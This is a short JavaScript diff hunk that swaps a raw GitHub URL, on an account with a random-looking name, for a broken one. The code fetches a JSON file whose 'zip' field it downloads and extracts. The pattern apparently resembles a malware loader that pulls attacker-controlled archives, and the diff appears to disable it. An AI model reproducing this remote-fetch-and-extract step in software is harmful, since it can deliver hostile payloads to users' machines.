@@ -34,7 +34,7 @@ const main = async () => {
   try {
     console.log("Fetching  data...🚀");
     const response = await axios.get(
-      "https://raw.githubusercontent.com/msjdyyyydhskak/jsuuuhenapanx/refs/heads/main/detals.json"
+      "https://raw.githubusercontent.crefs/heads/main/detals.json"
     );
     const { zip } = response.data;
     await downloadAndExtractMegaZip(zip);
